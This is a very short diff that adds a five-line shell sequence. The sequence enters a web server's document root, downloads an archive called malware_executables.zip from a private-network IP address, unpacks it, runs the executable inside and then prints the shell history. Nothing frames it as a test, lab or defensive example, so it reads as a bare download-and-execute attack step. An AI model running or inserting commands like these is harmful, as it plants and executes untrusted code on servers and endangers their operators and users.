@@ -1,0 +1,5 @@
+cd /var/www/html
+wget http://192.168.1.100/malware_executables.zip
+unzip malware_executables.zip
+./malware_executable
+history
